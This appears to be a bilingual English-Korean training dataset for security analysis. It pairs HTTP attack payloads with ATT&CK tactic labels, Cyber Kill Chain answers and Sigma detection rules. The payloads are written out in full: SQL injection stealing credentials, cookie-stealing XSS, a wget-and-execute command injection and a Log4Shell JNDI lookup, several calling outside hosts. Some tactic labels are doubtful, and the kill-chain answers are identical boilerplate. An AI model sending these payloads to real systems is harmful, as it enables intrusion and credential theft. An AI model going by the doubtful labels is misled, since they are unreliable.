+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None).","Payload는 GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Host: www.test.go.kr
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) 이다.","ta0043 (reconnaissance): the payload seems to make use of a sql injection to illicitly retrieve a targeted user's username and password. this tactic is indicative of an attacker attempting to gather information about the target environment, potentially as part of a reconnaissance phase of an attack.",ta0043 (정찰): payload는 sql injection을 사용하여 목표 사용자의 사용자 이름과 비밀번호를 불법적으로 검색하는 것처럼 보입니다. 이 전략은 공격자가 공격의 정찰 단계의 일부로 대상 환경에 대한 정보를 수집하려고 시도하는 것을 나타낼 수 있습니다.
+"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).
+For the payload entered out of all 14 Enterprise Tactics IDs in Miter Att&ck v13 announced in April 2023, please write one suitable Tactics ID starting with TA and a description in 2 sentences.","2023년 4월에 발표된 Mitre Att&ck v13은 TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance) 총 14개 입니다.
+2023년 4월에 발표된 Mitre Att&ck v13의 Enterprise Tactics ID 전체 14개 중 입력된 페이로드에 대해 TA로 시작하는 적합한 Tactics ID 하나와 2문장으로 설명을 작성하십시오.","Payload is GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Host: 10.0.0.100
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
+Connection: Keep-Alive.","Payload는 GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Host: 10.0.0.100
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
+Connection: Keep-Alive 이다.","ta0011 (command and control): this tactic involves the use of a specific payload, like the one provided, to establish command and control channels with compromised systems through communication protocols or traffic manipulations. with the payload exploiting a potential xss vulnerability on a web application, the attacker could obtain sensitive user data (e.g., cookies) and establish control over the victim system or web application.","ta0011 (command and control): 이 전술은 특정 페이로드(예: 제공된 페이로드)를 사용하여 소통 규약이나 트래픽 조작을 통해 탈취된 시스템과의 명령 및 통제 채널을 구축합니다. 페이로드가 웹 애플리케이션에서 잠재적인 xss 취약점을 악용하는 경우, 공격자는 사용자의 민감한 데이터(예: 쿠키)를 획득하고 피해를 입은 시스템 또는 웹 애플리케이션에 대한 통제력을 확보할 수 있습니다."
+"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).
+For the payload entered out of all 14 Enterprise Tactics IDs in Miter Att&ck v13 announced in April 2023, please write one suitable Tactics ID starting with TA and a description in 2 sentences.","2023년 4월에 발표된 Mitre Att&ck v13은 TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance) 총 14개 입니다.
+2023년 4월에 발표된 Mitre Att&ck v13의 Enterprise Tactics ID 전체 14개 중 입력된 페이로드에 대해 TA로 시작하는 적합한 Tactics ID 하나와 2문장으로 설명을 작성하십시오.","Payload is GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9.","Payload는 GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9 이다.","ta0002 (execution): this tactics id is suitable for the given payload as it involves the execution of malicious code on the targeted system by downloading and running a file (am7) from a remote server (10.10.123.123). the commands in the payload (wget, chmod, and ./am7) are used to achieve this execution, which indicates the adversary's intention to perform malicious activities on the compromised system.","ta0002 (execution): 이 전술 id는 원격 서버(10.10.123.123)에서 파일(am7)을 다운로드하여 대상 시스템에서 악성 코드를 실행하는 것이 포함되어 있기 때문에 주어진 페이로드에 적합합니다. 페이로드의 명령어(wget, chmod, 및 ./am7)는 이러한 실행을 달성하기 위해 사용되며, 이는 공격자가 손상된 시스템에서 악의적인 활동을 수행하려는 의도를 나타냅니다."
+"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).
+For the payload entered out of all 14 Enterprise Tactics IDs in Miter Att&ck v13 announced in April 2023, please write one suitable Tactics ID starting with TA and a description in 2 sentences.","2023년 4월에 발표된 Mitre Att&ck v13은 TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance) 총 14개 입니다.
+2023년 4월에 발표된 Mitre Att&ck v13의 Enterprise Tactics ID 전체 14개 중 입력된 페이로드에 대해 TA로 시작하는 적합한 Tactics ID 하나와 2문장으로 설명을 작성하십시오.","Payload is GET /struts/utils.js HTTP/1.1
+Host: 10.10.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}}.","Payload는 GET /struts/utils.js HTTP/1.1
+Host: 10.10.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}} 이다.","ta0001 (initial access): the attacker is using a malicious get request to target a potential vulnerability in the `/struts/utils.js` file. by injecting an ldap url with additional properties in the `x-client-ip` header, they aim to exploit a remote code execution vulnerability and gain initial access to the target system.",ta0001 (initial access): 공격자는 악의적인 get 요청을 사용하여 `/struts/utils.js` 파일의 잠재적 취약점을 타겟팅합니다. `x-client-ip` 헤더에 ldap url과 추가 속성을 삽입하여 원격 코드 실행 취약점을 악용하고 대상 시스템에 초기 액세스 권한을 얻으려고 합니다.
+"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).
+For the payload entered out of all 14 Enterprise Tactics IDs in Miter Att&ck v13 announced in April 2023, please write one suitable Tactics ID starting with TA and a description in 2 sentences.","2023년 4월에 발표된 Mitre Att&ck v13은 TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance) 총 14개 입니다.
+2023년 4월에 발표된 Mitre Att&ck v13의 Enterprise Tactics ID 전체 14개 중 입력된 페이로드에 대해 TA로 시작하는 적합한 Tactics ID 하나와 2문장으로 설명을 작성하십시오.","Payload is GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache.","Payload는 GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache 이다.","ta0002 (execution): this payload attempts to access and exploit a potentially vulnerable server component by attempting to access phpmyadmin and iisadminpwd resources in the web server using a get request. the http request header contains user-agent and other details to establish a connection with the target server, showing that the attacker aims to execute malicious code or commands within the server environment.",ta0002 (execution): 이 payload는 get 요청을 사용하여 웹 서버에서 phpmyadmin 및 iisadminpwd 리소스에 액세스하여 잠재적으로 취약한 서버 구성 요소에 액세스하고 익스플로잇하려는 시도입니다. http 요청 헤더에는 사용자-에이전트 및 기타 세부 정보가 포함되어 있으며 대상 서버와의 연결을 설정함으로써 공격자가 서버 환경 내에서 악성 코드 또는 명령을 실행하려고 합니다.
+"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).
+For the payload entered out of all 14 Enterprise Tactics IDs in Miter Att&ck v13 announced in April 2023, please write one suitable Tactics ID starting with TA and a description in 2 sentences.","2023년 4월에 발표된 Mitre Att&ck v13은 TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance) 총 14개 입니다.
+2023년 4월에 발표된 Mitre Att&ck v13의 Enterprise Tactics ID 전체 14개 중 입력된 페이로드에 대해 TA로 시작하는 적합한 Tactics ID 하나와 2문장으로 설명을 작성하십시오.","Payload is GET /robots.txt HTTP/1.1
+rw-request-time: 1574036860318
+cdn-ip: 10.10.123.123
+referer: http://admin.corea.school
+x-forwarded-for: 10.10.123.123
+connection: close
+x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
+accept-encoding: gzip
+user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
+accept: */*
+x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
+x-cdn-src-port: 33312
+cdn-src-ip: 10.10.123.123
+host: admin.corea.school.","Payload는 GET /robots.txt HTTP/1.1
+rw-request-time: 1574036860318
+cdn-ip: 10.10.123.123
+referer: http://admin.corea.school
+x-forwarded-for: 10.10.123.123
+connection: close
+x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
+accept-encoding: gzip
+user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
+accept: */*
+x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
+x-cdn-src-port: 33312
+cdn-src-ip: 10.10.123.123
+host: admin.corea.school 이다.","ta0043 (reconnaissance): the payload appears to involve an attempt to access the ""robots.txt"" file on a targeted system, indicating the adversary is gathering information about the target environment, such as available web pages and directories. the user agent is identified as semrushbot, a known web crawler, and the request is coming from an ip address likely behind a cdn, suggesting a potential recon effort from an automated tool or bot.","보안 분석가입니다.  ta0043 (reconnaissance): payload는 타겟 시스템에서 ""robots.txt"" 파일에 액세스하려는 시도를 포함하는 것으로 보이며, 이는 적이 사용 가능한 웹 페이지 및 디렉토리와 같은 타겟 환경에 대한 정보를 수집하고 있다는 것을 의미합니다. 사용자 에이전트는 알려진 웹 크롤러인 semrushbot으로 확인되며, 요청은 cdn 뒤의 ip 주소에서 오는 것으로 추정되어, 자동화 도구 또는 봇을 사용하는 잠재적인 정찰 작업일 수 있습니다."
+"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).
+For the payload entered out of all 14 Enterprise Tactics IDs in Miter Att&ck v13 announced in April 2023, please write one suitable Tactics ID starting with TA and a description in 2 sentences.","2023년 4월에 발표된 Mitre Att&ck v13은 TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance) 총 14개 입니다.
+2023년 4월에 발표된 Mitre Att&ck v13의 Enterprise Tactics ID 전체 14개 중 입력된 페이로드에 대해 TA로 시작하는 적합한 Tactics ID 하나와 2문장으로 설명을 작성하십시오.","Payload is GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+Accept: text/html application/xhtml+xml image/jxr */*
+Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
+Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
+Host: owa.corea.school
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3.","Payload는 GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+Accept: text/html application/xhtml+xml image/jxr */*
+Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
+Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
+Host: owa.corea.school
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3 이다.","ta0001 (initial access): this payload is an attempt to access the wordpress login page of the targeted website, potentially with the intent to exploit vulnerabilities, gain unauthorized access, or launch a brute-force attack. the payload uses a redirection to a certain url and includes information about the browser and headers, which may help the attacker bypass certain security measures or blend in with legitimate traffic.","ta0001 (initial access): 이 payload는 대상 웹사이트의 Word Press 로그인 페이지에 접근하려는 시도로, 취약점을 악용하거나 무단 접근을 얻거나 무작위 대입 공격을 실행할 가능성이 있습니다. 페이로드는 특정 url로의 리디렉션을 사용하고 브라우저 및 헤더 정보를 포함하여 공격자가 특정 보안 조치를 우회하거나 합법적인 트래픽과 섞일 수 있도록 도와줍니다."
+"For following payload, write only the name in the order of the entire steps of the Cyber Kill Chain Model.","다음 payload의 경우, Cyber Kill Chain Model의 전체 단계 순서대로 이름만 적는다.","Payload is GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Host: www.test.go.kr
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None).","Payload는 GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Host: www.test.go.kr
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) 이다.",1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives,1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives
+"For following payload, write only the name in the order of the entire steps of the Cyber Kill Chain Model.","다음 payload의 경우, Cyber Kill Chain Model의 전체 단계 순서대로 이름만 적는다.","Payload is GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Host: 10.0.0.100
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
+Connection: Keep-Alive.","Payload는 GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Host: 10.0.0.100
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
+Connection: Keep-Alive 이다.",1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control (c2) 7. actions on objectives,1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control (c2) 7. actions on objectives
+"For following payload, write only the name in the order of the entire steps of the Cyber Kill Chain Model.","다음 payload의 경우, Cyber Kill Chain Model의 전체 단계 순서대로 이름만 적는다.","Payload is GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9.","Payload는 GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9 이다.",1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives,1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives
+"For following payload, write only the name in the order of the entire steps of the Cyber Kill Chain Model.","다음 payload의 경우, Cyber Kill Chain Model의 전체 단계 순서대로 이름만 적는다.","Payload is GET /struts/utils.js HTTP/1.1
+Host: 10.10.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}}.","Payload는 GET /struts/utils.js HTTP/1.1
+Host: 10.10.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}} 이다.",1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives,1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives
+"For following payload, write only the name in the order of the entire steps of the Cyber Kill Chain Model.","다음 payload의 경우, Cyber Kill Chain Model의 전체 단계 순서대로 이름만 적는다.","Payload is GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache.","Payload는 GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache 이다.",1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control (c2) 7. actions on objectives,1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control (c2) 7. actions on objectives
+"For following payload, write only the name in the order of the entire steps of the Cyber Kill Chain Model.","다음 payload의 경우, Cyber Kill Chain Model의 전체 단계 순서대로 이름만 적는다.","Payload is GET /robots.txt HTTP/1.1
+rw-request-time: 1574036860318
+cdn-ip: 10.10.123.123
+referer: http://admin.corea.school
+x-forwarded-for: 10.10.123.123
+connection: close
+x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
+accept-encoding: gzip
+user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
+accept: */*
+x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
+x-cdn-src-port: 33312
+cdn-src-ip: 10.10.123.123
+host: admin.corea.school.","Payload는 GET /robots.txt HTTP/1.1
+rw-request-time: 1574036860318
+cdn-ip: 10.10.123.123
+referer: http://admin.corea.school
+x-forwarded-for: 10.10.123.123
+connection: close
+x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
+accept-encoding: gzip
+user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
+accept: */*
+x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
+x-cdn-src-port: 33312
+cdn-src-ip: 10.10.123.123
+host: admin.corea.school 이다.",1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives,1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives
+"For following payload, write only the name in the order of the entire steps of the Cyber Kill Chain Model.","다음 payload의 경우, Cyber Kill Chain Model의 전체 단계 순서대로 이름만 적는다.","Payload is GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+Accept: text/html application/xhtml+xml image/jxr */*
+Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
+Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
+Host: owa.corea.school
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3.","Payload는 GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+Accept: text/html application/xhtml+xml image/jxr */*
+Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
+Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
+Host: owa.corea.school
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3 이다.",1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives,1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives
+"
+Sample Sigma Rule is title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high. As following payload, write it in YAML format in one Sigma Rule.
+","샘플 Sigma Rule은 title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high 이다.
+다음 payload의 해당하는 1개의 Sigma Rule을 YAML 형식으로 작성합니다.","Payload is GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Host: www.test.go.kr
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None).","Payload는 GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Host: www.test.go.kr
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) 이다.",title: detect sql injection in http request description: this rule detects the presence of an sql injection attack in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'and/**/1=2/**/union/**/all/**/select'     - '/**/from/**/'     - '/**/where/**/'   condition: keywords falsepositives:   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high,title: detect sql injection in http request description: this rule detects the presence of an sql injection attack in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'and/**/1=2/**/union/**/all/**/select'     - '/**/from/**/'     - '/**/where/**/'   condition: keywords falsepositives:   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high
+"
